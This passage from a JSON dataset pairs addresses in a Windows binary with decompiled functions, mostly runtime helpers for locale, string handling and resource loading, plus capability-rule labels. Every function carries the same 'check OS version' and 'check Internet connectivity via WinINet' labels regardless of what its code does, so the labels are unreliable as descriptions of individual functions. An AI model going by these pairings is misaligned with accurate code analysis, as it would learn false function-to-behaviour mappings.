        "decompiled_code": "\nuint fcn.0040cfb8(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *in_stack_ffffffd0;\n    uint16_t in_stack_ffffffd4;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint32_t uStack32;\n    ushort uStack28;\n    ushort uStack26;\n    uchar auStack24 [4];\n    uchar auStack20 [4];\n    \n    uVar2 = 0;\n    iVar3 = -1;\n    cVar1 = fcn.0040ca14();\n    if ((cVar1 == '\\0') && (cVar1 = fcn.0040ca14(),  cVar1 == '\\0')) {\n        cVar1 = fcn.0040ca14();\n        if ((cVar1 != '\\0') || (cVar1 = fcn.0040ca14(),  cVar1 != '\\0')) {\n            iVar3 = 0xc;\n        }\n    }\n    else {\n        iVar3 = 0;\n    }\n    if (-1 < iVar3) {\n        fcn.0040c95c();\n    }\n    cVar1 = fcn.0040c980(&stack0xffffffec);\n    if (cVar1 != '\\0') {\n        uStack32 = uStack32 & 0xffff;\n        uStack28 = 0;\n        uStack26 = 0;\n        arg_8h_00 = 0x40d06a;\n        cVar1 = fcn.0040caec();\n        if (cVar1 != '\\0') {\n            arg_8h_00 = &stack0xffffffe8;\n            cVar1 = fcn.0040c980(arg_8h_00);\n            if (cVar1 == '\\0') {\n                return 0;\n            }\n            in_stack_ffffffd4 = 0xd098;\n            cVar1 = fcn.0040caec();\n            if (cVar1 != '\\0') {\n                arg_8h = &stack0xffffffe4;\n                cVar1 = fcn.0040c980(arg_8h);\n                in_stack_ffffffd4 = arg_8h;\n                if (cVar1 == '\\0') {\n                    return 0;\n                }\n                in_stack_ffffffd0 = 0x40d0c6;\n                cVar1 = fcn.0040caec();\n                if (cVar1 != '\\0') {\n                    in_stack_ffffffd0 = &stack0xffffffe0;\n                    cVar1 = fcn.0040c980(in_stack_ffffffd0);\n                    if (cVar1 == '\\0') {\n                        return 0;\n                    }\n                }\n            }\n        }\n        if (iVar3 < 0) {\n            cVar1 = fcn.0040ca14();\n            if ((cVar1 == '\\0') && (cVar1 = fcn.0040ca14(),  cVar1 == '\\0')) {\n                cVar1 = fcn.0040ca14();\n                if ((cVar1 != '\\0') || (cVar1 = fcn.0040ca14(),  cVar1 != '\\0')) {\n                    iVar3 = 0xc;\n                }\n            }\n            else {\n                iVar3 = 0;\n            }\n        }\n        if ((iVar3 < 0) || ((in_stack_ffffffd4 != 0 && (in_stack_ffffffd4 < 0xd)))) {\n            fcn.0040c95c();\n            uVar2 = fcn.0040b858(in_stack_ffffffd0, arg_8h_00 >> 0x10);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 821
    },
    "0040d3b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d3b4(int32_t *arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.0040d33c(arg_8h);\n    if (*arg_8h == 0) {\n        fcn.00407550();\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "0040d514": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d514(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 1;\n    while( true ) {\n        if (*(iVar1 * 4 + 0x4988d4) == 0) {\n            fcn.00405728();\n            return 1;\n        }\n        if (iVar1 == 7) break;\n        iVar1 = iVar1 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 105
    },
    "0040da3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040da3c(void)\n\n{\n    uint uVar1;\n    uint uStack1128;\n    uchar *puStack1124;\n    uchar *puStack1120;\n    uint uStack1116;\n    uchar *puStack1112;\n    uint uStack1108;\n    uchar *puStack1104;\n    uchar *puStack1100;\n    uchar auStack1092 [48];\n    uchar auStack1044 [8];\n    uchar auStack1036 [8];\n    uchar auStack1028 [1028];\n    \n    puStack1100 = 0x40da50;\n    fcn.0040d8b4(0x400);\n    if (**0x495ba4 == '\\0') {\n        puStack1100 = 0x40;\n        puStack1104 = &stack0xfffffbbc;\n        uStack1108 = *(*0x4958bc + 4);\n        puStack1112 = 0x40dad2;\n        puStack1112 = fcn.00406a10();\n        uStack1116 = 0x40dad8;\n        sub.user32.dll_LoadStringA_1();\n        uStack1116 = 0x2010;\n        puStack1120 = &stack0xfffffbac;\n        puStack1124 = &stack0xfffffbec;\n        uStack1128 = 0;\n        sub.user32.dll_MessageBoxA_1();\n    }\n    else {\n        puStack1100 = 0x40da64;\n        fcn.00403820();\n        puStack1100 = 0x40da69;\n        fcn.0040305c();\n        puStack1100 = &stack0xfffffbfc;\n        puStack1104 = &stack0xfffffbfc;\n        puStack1112 = &stack0xfffffbb0;\n        uStack1108 = 0x40da78;\n        sub.user32.dll_CharToOemA();\n        uStack1108 = 0;\n        uStack1116 = 0x40da88;\n        uStack1116 = fcn.0040a870();\n        puStack1120 = &stack0xfffffbf4;\n        puStack1124 = 0xfffffff4;\n        uStack1128 = 0x40da95;\n        uStack1128 = sub.kernel32.dll_GetStdHandle_1();\n        sub.kernel32.dll_WriteFile_1();\n        uVar1 = sub.kernel32.dll_GetStdHandle_1(0xfffffff4, 0x40db00, 2, &stack0xfffffb98, 0);\n        sub.kernel32.dll_WriteFile_1(uVar1);\n    }\n    return;\n}\n",
        "token_count": 580
    },
    "0040df5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040df5c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *puVar4;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint lpFilename;\n    uint lpBuffer;\n    uint hModule;\n    int32_t var_10h;\n    uint var_4h;\n    \n    puStack384 = &stack0xfffffffc;\n    var_14ch = 0;\n    var_154h = 0;\n    var_150h = 0;\n    var_4h = 0;\n    uStack388 = 0x40e117;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack392;\n    iVar1 = *(arg_8h + -4);\n    if (*(iVar1 + 0x14) == 0) {\n        puStack384 = &stack0xfffffffc;\n        fcn.00407550();\n    }\n    else {\n        fcn.00407550();\n    }\n    uVar2 = *(iVar1 + 0x18);\n    sub.kernel32.dll_VirtualQuery_1(*(iVar1 + 0xc), &lpBuffer, 0x1c);\n    if (var_10h == 0x1000) {\n        iVar3 = sub.kernel32.dll_GetModuleFileNameA_1(hModule, &lpFilename, 0x105);\n        if (iVar3 != 0) {\n            var_148h = *(iVar1 + 0xc);\n            var_144h._0_1_ = 5;\n            fcn.004057a0();\n            fcn.0040a694();\n            var_140h = var_14ch;\n            var_13ch._0_1_ = 0xb;\n            var_138h = var_4h;\n            var_134h._0_1_ = 0xb;\n            var_12ch._0_1_ = 5;\n            puVar4 = &var_148h;\n            arg_8h_00 = 3;\n            var_130h = uVar2;\n            fcn.00407550();\n            fcn.0040db40(arg_8h_00, puVar4);\n            goto code_r0x0040e0e6;\n        }\n    }\n    var_16ch = *(iVar1 + 0xc);\n    var_168h._0_1_ = 5;\n    var_164h = var_4h;\n    var_160h._0_1_ = 0xb;\n    var_158h._0_1_ = 5;\n    puVar4 = &var_16ch;\n    arg_8h_00 = 2;\n    var_15ch = uVar2;\n    fcn.00407550();\n    fcn.0040db40(arg_8h_00, puVar4);\ncode_r0x0040e0e6:\n    *in_FS_OFFSET = arg_8h_00;\n    fcn.00405530(0x40e11e);\n    fcn.00405554();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 861
    },
    "0040e284": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040e284(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*0x49891c != NULL) {\n        *(*0x49891c + 3) = 1;\n        (**(**0x49891c + -8))();\n        *0x49891c = NULL;\n    }\n    if (*0x498920 != 0) {\n        *(*0x498920 + 0xc) = 1;\n        fcn.00404650();\n        *0x498920 = 0;\n    }\n    **0x49581c = 0;\n    **0x495970 = 0;\n    **0x49589c = 0;\n    **0x495950 = 0;\n    **0x49597c = 0;\n    **0x495afc = 0;\n    iVar1 = fcn.00402f84();\n    if (iVar1 != 0) {\n        uVar2 = fcn.00402fa4();\n        fcn.00402f84(uVar2);\n        fcn.0040e1f0();\n    }\n    return;\n}\n",
        "token_count": 252
    },
    "0040e498": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e498(uint param_1, int32_t param_2)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    uVar2 = 0;\n    if ((in_EAX != NULL) && (in_EAX[param_2] != 0)) {\n        if (param_2 == 0) {\n            if ((*((*in_EAX >> 3) + 0x492828) >> (*in_EAX & 7) & 1) != 0) {\n                uVar2 = 1;\n            }\n        }\n        else {\n            iVar3 = param_2 + -1;\n            while ((-1 < iVar3 && ((*((in_EAX[iVar3] >> 3) + 0x492828) >> (in_EAX[iVar3] & 7) & 1) != 0))) {\n                iVar3 = iVar3 + -1;\n            }\n            uVar1 = param_2 - iVar3 & 0x80000001;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n            }\n            if (uVar1 == 0) {\n                uVar2 = 2;\n            }\n            else if ((*((in_EAX[param_2] >> 3) + 0x492828) >> (in_EAX[param_2] & 7) & 1) != 0) {\n                uVar2 = 1;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 361
    },
    "0040e50c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040e50c(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*0x4988d4 != '\\0') {\n        fcn.004059dc();\n        uVar1 = fcn.0040e498();\n    }\n    return uVar1;\n}\n",
        "token_count": 72
    },
    "0040e530": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040e530(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*0x4988d4 != '\\0') {\n        uVar1 = fcn.0040e498();\n    }\n    return uVar1;\n}\n",
        "token_count": 63
    },
    "0040e758": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0040e758(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*0x4988d4 != '\\0') {\n        iVar1 = sub.user32.dll_CharNextA_1();\n        return iVar1 - in_EAX;\n    }\n    return 1;\n}\n",
        "token_count": 75
    },
    "0040e780": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e780(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = 1;\n    if ((*0x4988d4 != '\\0') && (uVar2 = *(in_EAX + -1 + param_2),  (*((uVar2 >> 3) + 0x492828) >> (uVar2 & 7) & 1) != 0)\n       ) {\n        fcn.004059dc();\n        uVar1 = fcn.0040e758();\n    }\n    return uVar1;\n}\n",
        "token_count": 152
    },
    "0040e7b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e7b8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = param_2 + 1;\n    if ((*0x4988d4 != '\\0') && (uVar2 = *(in_EAX + -1 + param_2),  (*((uVar2 >> 3) + 0x492828) >> (uVar2 & 7) & 1) != 0)\n       ) {\n        fcn.004059dc();\n        iVar1 = fcn.0040e758();\n        iVar1 = iVar1 + param_2;\n    }\n    return iVar1;\n}\n",
        "token_count": 169
    },
    "0040e9a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040e9a0(uint param_1, char *param_2)\n\n{\n    uint8_t uVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack24;\n    uint32_t uStack20;\n    \n    iVar4 = 0;\n    if ((((in_EAX != NULL) && (*in_EAX != '\\0')) && (param_2 != NULL)) && (*param_2 != '\\0')) {\n        iStack24 = fcn.0040a870();\n        uVar2 = fcn.0040a870();\n        iVar4 = fcn.0040aa5c();\n        while ((iVar4 != 0 && (uVar2 <= iStack24 - (iVar4 - in_EAX)))) {\n            uVar1 = fcn.0040e530();\n            uStack20 = uStack20 & 0xffffff00 | uVar1;\n            if (uVar1 != 2) {\n                iStack24 = 0x400;\n                iVar3 = sub.kernel32.dll_CompareStringA_1();\n                if (iVar3 == 2) goto code_r0x0040ea36;\n            }\n            iVar4 = fcn.0040aa5c();\n        }\n        iVar4 = 0;\n    }\ncode_r0x0040ea36:\n    return CONCAT44(uStack20, iVar4);\n}\n",
        "token_count": 321
    },
    "0040ebd4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.0040ebd4(void)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint *in_FS_OFFSET;\n    uint *var_40h;\n    uint *var_3ch;\n    uint *var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint *var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    iVar1 = 8;\n    do {\n        var_4h = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    var_14h = 0x40ee9f;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0040ebd4::var_18h;\n    var_1ch = 0x40ebf7;\n    var_ch = unaff_EBX;\n    fcn.0040eb10();\n    var_1ch = 0x40ebfc;\n    fcn.0040d3f0();\n    if (*0x4988d4 != '\\0') {\n        var_1ch = 0x40ec0a;\n        fcn.0040d5c8();\n    }\n    var_1ch = 0x40ec0f;\n    sub.kernel32.dll_GetThreadLocale_1();\n    var_1ch = &fcn.0040ebd4::var_10h;\n    var_20h = 0x40ec23;\n    fcn.0040d33c(var_1ch);\n    var_20h = 0x40ec30;\n    fcn.00405584();\n    var_20h = &fcn.0040ebd4::var_14h;\n    var_24h = 0x40ec45;\n    fcn.0040d33c(var_20h);\n    var_24h = 0x40ec4f;\n    *0x49880c = fcn.00409f20();\n    var_24h = &fcn.0040ebd4::var_18h;\n    var_28h = 0x40ec69;\n    fcn.0040d33c(var_24h);\n    var_28h = 0x40ec73;\n    *0x49880d = fcn.00409f20();\n    var_28h = 0x40ec86;\n    *0x49880e = fcn.0040d388();\n    var_28h = 0x40ec99;\n    *0x49880f = fcn.0040d388();\n    var_28h = &fcn.0040ebd4::var_1ch;\n    var_2ch = 0x40ecb3;\n    fcn.0040d33c(var_28h);\n    var_2ch = 0x40ecbd;\n    *0x498810 = fcn.00409f20();\n    var_2ch = 0x40ecd0;\n    *0x498811 = fcn.0040d388();\n    var_2ch = &fcn.0040ebd4::var_24h;\n    var_30h = 0x40ecea;\n    fcn.0040d33c(var_2ch);\n    var_30h = 0x40ecf5;\n    fcn.0040d678();\n    var_30h = 0x40ed02;\n    fcn.00405584();\n    var_30h = &fcn.0040ebd4::var_2ch;\n    var_34h = 0x40ed17;\n    fcn.0040d33c(var_30h);\n    var_34h = 0x40ed22;\n    fcn.0040d678();\n    var_34h = 0x40ed2f;\n    fcn.00405584();\n    var_34h = 0x40ed3d;\n    *0x49881c = fcn.0040d388();\n    var_34h = &fcn.0040ebd4::var_30h;\n    var_38h = 0x40ed57;\n    fcn.0040d33c(var_34h);\n    var_38h = 0x40ed64;\n    fcn.00405584();\n    var_38h = &fcn.0040ebd4::var_34h;\n    var_3ch = 0x40ed79;\n    fcn.0040d33c(var_38h);\n    var_3ch = 0x40ed86;\n    fcn.00405584();\n    var_3ch = 0x40ed8e;\n    fcn.00405530();\n    var_3ch = 0x40ed96;\n    fcn.00405530();\n    var_3ch = &fcn.0040ebd4::var_38h;\n    var_40h = 0x40edab;\n    fcn.0040d33c(var_3ch);\n    var_40h = 0x40edb5;\n    iVar1 = fcn.00409f20();\n    if (iVar1 == 0) {\n        var_40h = 0x40edc6;\n        fcn.004055c8();\n    }\n    else {\n        var_40h = 0x40edd5;\n        fcn.004055c8();\n    }\n    var_40h = &fcn.0040ebd4::var_3ch;\n    fcn.0040d33c(var_40h);\n    iVar1 = fcn.00409f20();\n    if (iVar1 == 0) {\n        fcn.0040d33c(&fcn.0040ebd4::var_40h);\n        iVar1 = fcn.00409f20();\n        if (iVar1 == 0) {\n            fcn.004055c8();\n        }\n        else {\n            fcn.004055c8();\n        }\n    }\n    fcn.004058e0(var_ch, 0x40ef38, var_4h, var_8h);\n    fcn.004058e0(var_ch, 0x40ef44, var_4h, var_8h);\n    *0x4988d6 = fcn.0040d388();\n    *in_FS_OFFSET = var_ch;\n    fcn.00405554(0x40eea6);\n    return;\n}\n",
        "token_count": 1684
    },
    "0040f0fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0040f0fc(void)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    \n    uVar1 = 0;\n    while( true ) {\n        uVar2 = uVar1 << 5 | uVar1 >> 0x1b;\n        uVar3 = *in_EAX;\n        if (uVar3 == 0) break;\n        if (('@' < uVar3) && (uVar3 < '[')) {\n            uVar3 = uVar3 | 0x20;\n        }\n        uVar1 = uVar1 << 5 & 0xffffff00 | uVar2 ^ uVar3;\n        in_EAX = in_EAX + 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 188
    },
    "0040f348": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040f348(void)\n\n{\n    while( true ) {\n        if (*0x492a20 == NULL) break;\n        *0x492a20 = **0x492a20;\n        fcn.00402f1c();\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "0040f3ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0040f3ac(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (**0x495954 == 0) {\n        iVar3 = 0;\n        for (puVar1 = **0x495c14; puVar1 != NULL; puVar1 = *puVar1) {\n            sub.kernel32.dll_FindResourceA(puVar1[1], 0x40f41c, 10);\n            iVar3 = sub.kernel32.dll_LoadResource();\n            if (iVar3 != 0) {\n                return iVar3;\n            }\n        }\n    }\n    else {\n        uVar2 = sub.kernel32.dll_FindResourceA(**0x495954, 0x40f41c, 10);\n        iVar3 = sub.kernel32.dll_LoadResource(**0x495954, uVar2);\n    }\n    return iVar3;\n}\n",
        "token_count": 203
    },
    "0040f424": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040f424(uint32_t param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = 0x40f42e;\n    iVar2 = fcn.0040f3ac(param_1);\n    iVar3 = *0x492a30;\n    if (iVar2 != 0) {\n        iVar3 = fcn.0040f36c();\n        iVar4 = fcn.0040f37c();\n        if ((((iVar3 == *0x492a24) && (iVar4 == *0x492a34)) || ((iVar3 == *0x492a28 && (iVar4 == *0x492a38)))) ||\n           ((iVar3 == *0x492a2c && (iVar4 == *0x492a3c)))) {\n            uVar1 = 1;\n        }\n        else {\n            uVar1 = 0;\n        }\n        sub.kernel32.dll_FreeResource(iVar2, param_1 & 0xffffff00 | uVar1);\n        iVar4 = iVar2;\n        if (iVar2 == '\\0') {\n            fcn.0040f394();\n            iVar4 = iVar2;\n        }\n    }\n    return CONCAT44(iVar4, iVar3);\n}\n",
        "token_count": 295
    },
    "0040f4b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040f4b4(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x40f4ec);\n    if (iVar1 != 0) {\n        *0x49284c = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x40f4fc);\n    }\n    if (*0x49284c == NULL) {\n        *0x49284c = fcn.0040a750;\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "0040fa9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040fa9c(void)\n\n{\n    uint *puVar1;\n    \n    for (puVar1 = **0x495c14; puVar1 != NULL; puVar1 = *puVar1) {\n        if (puVar1[5] != 0) {\n            fcn.0040641c();\n            puVar1[5] = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "004104cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004104cc(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EDX;\n    \n    iVar1 = in_EDX;\n    if (*(arg_8h + -4) != 0) {\n        iVar1 = sub.kernel32.dll_GetProcAddress_1(*(arg_8h + -4));\n        if (iVar1 == 0) {\n            iVar1 = in_EDX;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 110
    },
    "00411d3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411d3c(uint32_t param_1, uint16_t *param_2)\n\n{\n    float10 fVar1;\n    ulong uVar2;\n    \n    if (param_1 != *param_2) {\n        if (*param_2 == 0x400c) {\n            fcn.00411d3c();\n        }\n        else {\n    // switch table (21 cases) at 0x411d81\n            switch(param_1) {\n            case 0:\n                if ((*param_2 == 1) && (*0x492a5c != '\\0')) {\n                    fcn.00410e60();\n                }\n                else {\n                    fcn.00411644();\n                }\n                break;\n            case 1:\n                fcn.004113ac();\n                break;\n            case 2:\n                fcn.004126ac();\n                fcn.0041598c();\n                break;\n            case 3:\n                fcn.00412100();\n                fcn.004158ec();\n                break;\n            case 4:\n                fVar1 = fcn.00413a54();\n                fcn.004159d8(fVar1);\n                break;\n            case 5:\n                fVar1 = fcn.004136dc();\n                fcn.004159fc(SUB84(fVar1, 0), fVar1 >> 0x20);\n                break;\n            case 6:\n                fVar1 = fcn.00414394();\n                fcn.00415a28(ROUND(fVar1), ROUND(fVar1) >> 0x20);\n                break;\n            case 7:\n                fVar1 = fcn.00413e2c();\n                fcn.00415a54(SUB84(fVar1, 0), fVar1 >> 0x20);\n                break;\n            case 8:\n                fcn.00411b20();\n                break;\n            case 9:\n                fcn.00411bb8();\n                break;\n            default:\n                if (param_1 == 0x100) {\n                    fcn.00411b6c();\n                }\n                else if (param_1 == 0x101) {\n                    fcn.00410e60();\n                }\n                else {\n                    fcn.00411cd0();\n                }\n                break;\n            case 0xb:\n                fcn.004131c8();\n                fcn.00415a80();\n                break;\n            case 0xd:\n                fcn.00411c04();\n                break;\n            case 0x10:\n                fcn.00412550();\n                fcn.0041596c();\n                break;\n            case 0x11:\n                fcn.00412604();\n                fcn.0041590c();\n                break;\n            case 0x12:\n                fcn.004127a4();\n                fcn.0041592c();\n                break;\n            case 0x13:\n                fcn.00412880();\n                fcn.0041594c();\n                break;\n            case 0x14:\n                uVar2 = fcn.00412bd0();\n                fcn.004159ac(uVar2, uVar2 >> 0x20);\n            }\n        }\n        return;\n    }\n    fcn.00411a70();\n    return;\n}\n",
        "token_count": 720
    },
    "00412100": {
        "rules": [
